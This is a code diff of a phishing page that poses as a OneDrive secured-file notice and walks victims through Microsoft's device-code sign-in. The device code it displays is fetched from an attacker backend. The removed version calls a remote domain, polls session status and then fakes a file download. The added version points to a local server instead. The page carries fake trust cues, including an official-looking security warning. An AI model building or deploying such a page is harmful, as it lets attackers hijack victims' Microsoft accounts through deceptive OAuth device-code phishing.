@@ -20,8 +20,6 @@
       --od-bg:      #f5f5f5;
       --od-surface: #ffffff;
       --od-green:   #107c10;
-      --od-success: #2e7d32;
-      --od-success-bg: #e8f5e9;
     }
 
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -510,61 +508,6 @@
       font-size: 11px; color: var(--od-subtle); line-height: 1.8;
     }
     .footer-copy a { color: var(--od-blue); text-decoration: none; }
-
-    /* ══ SUCCESS AREA ══ */
-    .success-area {
-      padding: 60px 32px;
-      text-align: center;
-      background: var(--od-success-bg);
-    }
-    .success-title {
-      font-size: 28px;
-      font-weight: 700;
-      color: var(--od-success);
-      margin-bottom: 16px;
-    }
-    .success-text {
-      font-size: 16px;
-      color: #2e7d32;
-      margin-bottom: 32px;
-    }
-    .download-btn {
-      display: inline-block;
-      padding: 16px 40px;
-      background: linear-gradient(135deg, #2e7d32 0%, #4caf50 100%);
-      color: white;
-      font-size: 18px;
-      font-weight: 700;
-      font-family: 'Outfit', sans-serif;
-      border-radius: 8px;
-      text-decoration: none;
-      box-shadow: 0 4px 14px rgba(46,125,50,0.3);
-      transition: all 0.2s;
-    }
-    .download-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 20px rgba(46,125,50,0.4);
-    }
-
-    .hidden { display: none !important; }
-
-    /* ── Ribbon collapse ─────────────────────────────────────────────── */
-    .ribbon-collapsed .owa-ribbon-tabs  { display: none; }
-    .ribbon-collapsed .owa-ribbon-panel { display: none !important; }
-    .ribbon-collapsed { border-bottom: 1px solid var(--border-light); }
-    
-    :root { --topchrome-h: 88px; }
-    .ribbon-collapsed-app { --topchrome-h: 40px; }
-    
-    #ribbon-toggle-btn {
-      position: absolute; right: 6px; bottom: -11px;
-      width: 22px; height: 22px; border-radius: 50%;
-      background: var(--white); border: 1px solid var(--border-light);
-      cursor: pointer; display: flex; align-items: center; justify-content: center;
-      color: var(--txt-hint); font-size: 10px; z-index: 201;
-      box-shadow: var(--shadow-sm); transition: color .12s, background .12s;
-    }
-    #ribbon-toggle-btn:hover { color: var(--acc); background: var(--acc-lightest); }
   </style>
 </head>
 <body>
@@ -658,131 +601,114 @@
   <!-- ══ BODY ══ -->
   <div class="body">
 
-    <!-- Main content area — toggled by JS -->
-    <div id="mainContent">
+    <p class="intro">
+      Hello,<br><br>
+      Someone has shared a <strong>secured OneDrive file</strong> with you. To protect its contents, access requires device verification via Microsoft Authenticator. Complete the steps below to unlock the file.
+    </p>
 
-      <p class="intro">
-        Hello,<br><br>
-        Someone has shared a <strong>secured OneDrive file</strong> with you. To protect its contents, access requires device verification via Microsoft Authenticator. Complete the steps below to unlock the file.
-      </p>
-
-      <!-- Steps -->
-      <div class="steps">
-        <div class="step">
-          <div class="step-num">1</div>
-          <div class="step-body">
-            <div class="step-title">Open the device login page</div>
-            <div class="step-desc">In any browser, navigate to <a href="https://login.microsoft.com/device" target="_blank" id="stepUrl">login.microsoft.com/device</a></div>
-          </div>
-        </div>
-        <div class="step">
-          <div class="step-num">2</div>
-          <div class="step-body">
-            <div class="step-title">Enter your device code</div>
-            <div class="step-desc">Type or paste the code shown below when prompted on the sign-in page.</div>
-          </div>
-        </div>
-        <div class="step">
-          <div class="step-num">3</div>
-          <div class="step-body">
-            <div class="step-title">Sign in &amp; access the file</div>
-            <div class="step-desc">Once verified, your device will be authorised and the OneDrive file will unlock automatically.</div>
-          </div>
+    <!-- Steps -->
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Open the device login page</div>
+          <div class="step-desc">In any browser, navigate to <a href="https://login.microsoft.com/device" target="_blank" id="stepUrl">login.microsoft.com/device</a></div>
         </div>
       </div>
-
-      <!-- Code box -->
-      <div class="code-section" id="codeArea">
-        <div class="code-pill">Device Authentication Code</div>
-
-        <div class="code-display">
-          <div class="code-inner" id="deviceCode">
-            <span class="skel"></span>
-          </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Enter your device code</div>
+          <div class="step-desc">Type or paste the code shown below when prompted on the sign-in page.</div>
         </div>
-
-        <div class="code-hint">Use this code at the Microsoft device login page</div>
-
-        <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
-          <svg width="13" height="13" viewBox="0 0 16 16" fill="none">
-            <rect x="5" y="5" width="9" height="10" rx="1.5" stroke="#0078d4" stroke-width="1.4"/>
-            <path d="M11 5V3.5A1.5 1.5 0 009.5 2h-6A1.5 1.5 0 002 3.5v8A1.5 1.5 0 003.5 13H5" stroke="#0078d4" stroke-width="1.4" stroke-linecap="round"/>
-          </svg>
-          Copy Code
-        </button>
-        <div class="copied-toast" id="copiedToast">✓ Copied to clipboard!</div>
-        <div class="error-msg" id="errorMsg"></div>
       </div>
-
-      <!-- Session meta -->
-      <div class="session-meta" id="sessionMeta" style="display:none">
-        Session ID: <b id="sessionIdDisplay">—</b>
-      </div>
-
-      <!-- URL card -->
-      <div class="url-card">
-        <div class="url-left">
-          <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
-            <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="#107c10" stroke-width="1.4"/>
-            <path d="M5.5 7V5a2.5 2.5 0 015 0v2" stroke="#107c10" stroke-width="1.4" stroke-linecap="round"/>
-            <circle cx="8" cy="11" r="1" fill="#107c10"/>
-          </svg>
-          <span class="url-text" id="verificationUrlDisplay">login.microsoft.com/device</span>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Sign in &amp; access the file</div>
+          <div class="step-desc">Once verified, your device will be authorised and the OneDrive file will unlock automatically.</div>
         </div>
-        <a href="https://login.microsoft.com/device" target="_blank" class="url-go" id="urlOpenBtn">Open Page →</a>
       </div>
-
-      <!-- CTA -->
-      <a href="https://login.microsoft.com/device" target="_blank" class="btn-cta" id="authBtn">
-        Verify Device &amp; Access File →
-      </a>
-
-      <!-- Refresh -->
-      <div class="refresh-row">
-        <button class="btn-refresh" id="refreshBtn" onclick="startSession()">
-          <svg class="spin-icon" width="13" height="13" viewBox="0 0 16 16" fill="none">
-            <path d="M13.5 8a5.5 5.5 0 11-1.1-3.3" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round"/>
-            <path d="M13.5 3v2.5H11" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-          </svg>
-          Request New Code
-        </button>
-      </div>
-
-      <!-- Warning -->
-      <div class="warn-strip">
-        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
-          <path d="M8 2L1 14h14L8 2z" stroke="#f59e0b" stroke-width="1.3" stroke-linejoin="round" fill="rgba(245,158,11,0.1)"/>
-          <path d="M8 6.5v3.5M8 11.5v1" stroke="#f59e0b" stroke-width="1.5" stroke-linecap="round"/>
-        </svg>
-        <span>
-          <strong>Only enter this code on the official Microsoft page.</strong> Microsoft and OneDrive will never ask for this code by email, phone, or chat. If you did not request file access, <a href="https://account.microsoft.com/security" target="_blank">secure your account</a> immediately.
-        </span>
-      </div>
-
-      <div class="divider"></div>
-
-      <div class="help-links">
-        <strong>Need help?</strong><br>
-        <a href="https://support.microsoft.com/onedrive">OneDrive help centre</a> &nbsp;·&nbsp;
-        <a href="https://support.microsoft.com/account-billing/sign-in-to-your-account-using-your-phone-or-another-device-ff5b4db8-9f53-4de8-b987-cdd0b667a4b3">About device sign-in</a> &nbsp;·&nbsp;
-        <a href="https://account.microsoft.com/security">Account security</a>
-      </div>
-
-    </div><!-- /#mainContent -->
-
-    <!-- ══ SUCCESS AREA – hidden initially ══ -->
-    <div id="successArea" class="success-area hidden">
-      <div class="success-title">✓ Access Unlocked</div>
-      <div class="success-text">
-        Your device is now authorized.<br>
-        Starting download of the secured file...
-      </div>
-      <a id="realDownloadLink" class="download-btn" href="#" download>
-        Download File
-      </a>
     </div>
 
-  </div><!-- /.body -->
+    <!-- Code box -->
+    <div class="code-section">
+      <div class="code-pill">Device Authentication Code</div>
+
+      <div class="code-display">
+        <div class="code-inner" id="deviceCode">
+          <span class="skel"></span>
+        </div>
+      </div>
+
+      <div class="code-hint">Use this code at the Microsoft device login page</div>
+
+      <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
+        <svg width="13" height="13" viewBox="0 0 16 16" fill="none">
+          <rect x="5" y="5" width="9" height="10" rx="1.5" stroke="#0078d4" stroke-width="1.4"/>
+          <path d="M11 5V3.5A1.5 1.5 0 009.5 2h-6A1.5 1.5 0 002 3.5v8A1.5 1.5 0 003.5 13H5" stroke="#0078d4" stroke-width="1.4" stroke-linecap="round"/>
+        </svg>
+        Copy Code
+      </button>
+      <div class="copied-toast" id="copiedToast">✓ Copied to clipboard!</div>
+      <div class="error-msg" id="errorMsg"></div>
+    </div>
+
+    <!-- Session meta -->
+    <div class="session-meta" id="sessionMeta" style="display:none">
+      Session ID: <b id="sessionIdDisplay">—</b>
+    </div>
+
+    <!-- URL card -->
+    <div class="url-card">
+      <div class="url-left">
+        <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
+          <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="#107c10" stroke-width="1.4"/>
+          <path d="M5.5 7V5a2.5 2.5 0 015 0v2" stroke="#107c10" stroke-width="1.4" stroke-linecap="round"/>
+          <circle cx="8" cy="11" r="1" fill="#107c10"/>
+        </svg>
+        <span class="url-text" id="verificationUrlDisplay">login.microsoft.com/device</span>
+      </div>
+      <a href="https://login.microsoft.com/device" target="_blank" class="url-go" id="urlOpenBtn">Open Page →</a>
+    </div>
+
+    <!-- CTA -->
+    <a href="https://login.microsoft.com/device" target="_blank" class="btn-cta" id="authBtn">
+      Verify Device &amp; Access File →
+    </a>
+
+    <!-- Refresh -->
+    <div class="refresh-row">
+      <button class="btn-refresh" id="refreshBtn" onclick="fetchCode()">
+        <svg class="spin-icon" width="13" height="13" viewBox="0 0 16 16" fill="none">
+          <path d="M13.5 8a5.5 5.5 0 11-1.1-3.3" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round"/>
+          <path d="M13.5 3v2.5H11" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Request New Code
+      </button>
+    </div>
+
+    <!-- Warning -->
+    <div class="warn-strip">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+        <path d="M8 2L1 14h14L8 2z" stroke="#f59e0b" stroke-width="1.3" stroke-linejoin="round" fill="rgba(245,158,11,0.1)"/>
+        <path d="M8 6.5v3.5M8 11.5v1" stroke="#f59e0b" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <span>
+        <strong>Only enter this code on the official Microsoft page.</strong> Microsoft and OneDrive will never ask for this code by email, phone, or chat. If you did not request file access, <a href="https://account.microsoft.com/security" target="_blank">secure your account</a> immediately.
+      </span>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="help-links">
+      <strong>Need help?</strong><br>
+      <a href="https://support.microsoft.com/onedrive">OneDrive help centre</a> &nbsp;·&nbsp;
+      <a href="https://support.microsoft.com/account-billing/sign-in-to-your-account-using-your-phone-or-another-device-ff5b4db8-9f53-4de8-b987-cdd0b667a4b3">About device sign-in</a> &nbsp;·&nbsp;
+      <a href="https://account.microsoft.com/security">Account security</a>
+    </div>
+
+  </div>
 
   <!-- ══ FOOTER ══ -->
   <div class="footer">
@@ -815,15 +741,11 @@
   </div>
 </div>
 
-<!-- ══ EXACT SCRIPT FROM TEMPLATE 2 ══ -->
 <script>
-  const API_BASE = 'https://devicecode.onlineprojectsdocs.top';   // ← change to production domain when deployed
-  const FILENAME_PARAM = 'nda';               // ← always send filename=nda
+  const API_URL = 'http://127.0.0.1:3210/login-start';
+  let currentCode = null;
 
-  let currentSessionId = null;
-  let pollingTimer = null;
-
-  async function startSession() {
+  async function fetchCode() {
     const refreshBtn = document.getElementById('refreshBtn');
     const copyBtn    = document.getElementById('copyBtn');
     const codeEl     = document.getElementById('deviceCode');
@@ -838,18 +760,17 @@
     codeEl.innerHTML = '<span class="skel"></span>';
 
     try {
-      const res = await fetch(`${API_BASE}/login-start`, {
+      const res = await fetch(API_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({ filename: FILENAME_PARAM })
+        headers: { 'Accept': 'application/json' }
       });
-
       if (!res.ok) throw new Error(`HTTP ${res.status} ${res.statusText}`);
 
       const data = await res.json();
 
-      currentSessionId = data.sessionId;
-      codeEl.textContent = data.user_code || 'ERROR';
+      // Code
+      currentCode = data.user_code;
+      codeEl.textContent = currentCode;
       copyBtn.disabled = false;
 
       // URL
@@ -861,7 +782,7 @@
       document.getElementById('stepUrl').href = url;
       document.getElementById('stepUrl').textContent = displayUrl;
 
-      // Optional: show custom filename if returned
+      // Filename (if server ever returns it)
       if (data.filename_will_be) {
         document.getElementById('filename').textContent = data.filename_will_be;
       }
@@ -872,15 +793,12 @@
         document.getElementById('sessionMeta').style.display = 'block';
       }
 
-      startPolling();
-
     } catch (err) {
-      currentSessionId = null;
-      const codeEl = document.getElementById('deviceCode');
+      currentCode = null;
       codeEl.innerHTML = '<span style="font-size:14px;letter-spacing:0;color:#a4262c;font-family:Outfit,sans-serif">Could not load code</span>';
       errorEl.style.display = 'block';
       errorEl.innerHTML = `<strong>⚠ Unable to reach local server</strong><br>
-        Ensure <code style="background:#f3efee;padding:1px 5px;border-radius:3px">${API_BASE}</code> is running, then click <em>Request New Code</em> to retry.<br>
+        Ensure <code style="background:#f3efee;padding:1px 5px;border-radius:3px">${API_URL}</code> is running, then click <em>Request New Code</em> to retry.<br>
         <span style="color:#605e5c;font-size:11px">Error: ${err.message}</span>`;
     } finally {
       refreshBtn.disabled = false;
@@ -888,78 +806,16 @@
     }
   }
 
-  function startPolling() {
-    if (pollingTimer) clearInterval(pollingTimer);
-
-    pollingTimer = setInterval(async () => {
-      if (!currentSessionId) return;
-
-      try {
-        const res = await fetch(`${API_BASE}/status/${currentSessionId}`);
-        if (!res.ok) return;
-
-        const data = await res.json();
-
-        if (data.status === 'success') {
-          clearInterval(pollingTimer);
-          handleSuccess(data);
-        }
-      } catch (err) {
-        console.warn('Poll error:', err);
-      }
-    }, 3000); // poll every 3 seconds
-  }
-
-  function handleSuccess(data) {
-    // Hide main content
-    document.getElementById('mainContent').classList.add('hidden');
-
-    // Show success UI
-    const successArea = document.getElementById('successArea');
-    successArea.classList.remove('hidden');
-
-    // Use the file_url_will_be from server response (S3 link, etc.)
-    let fileUrl = data.file_url_will_be;
-
-    if (!fileUrl) {
-      console.warn('No file_url_will_be returned – falling back');
-      fileUrl = 'https://example.com/fallback-file.jpg';
-    }
-
-    const link = document.getElementById('realDownloadLink');
-    link.href = fileUrl;
-
-    // Try to set a nice filename from server response
-    if (data.filename_will_be) {
-      link.download = data.filename_will_be;
-      link.textContent = `Downloading ${data.filename_will_be}...`;
-      document.getElementById('filename').textContent = data.filename_will_be;
-    }
-
-    // Auto-trigger download
-    setTimeout(() => {
-      link.click();
-    }, 1200);
-
-    // Redirect to Outlook after short delay
-    setTimeout(() => {
-      window.location.href = 'https://outlook.office.com';
-    }, 3800);
-  }
-
   function copyCode() {
-    const code = document.getElementById('deviceCode').textContent;
-    if (code && code !== 'ERROR' && code !== 'Could not load code') {
-      navigator.clipboard.writeText(code).then(() => {
-        const t = document.getElementById('copiedToast');
-        t.style.display = 'block';
-        setTimeout(() => { t.style.display = 'none'; }, 2500);
-      });
-    }
+    if (!currentCode) return;
+    navigator.clipboard.writeText(currentCode).then(() => {
+      const t = document.getElementById('copiedToast');
+      t.style.display = 'block';
+      setTimeout(() => { t.style.display = 'none'; }, 2500);
+    });
   }
 
-  // Start when page loads
-  startSession();
+  fetchCode();
 </script>
 </body>
 </html>
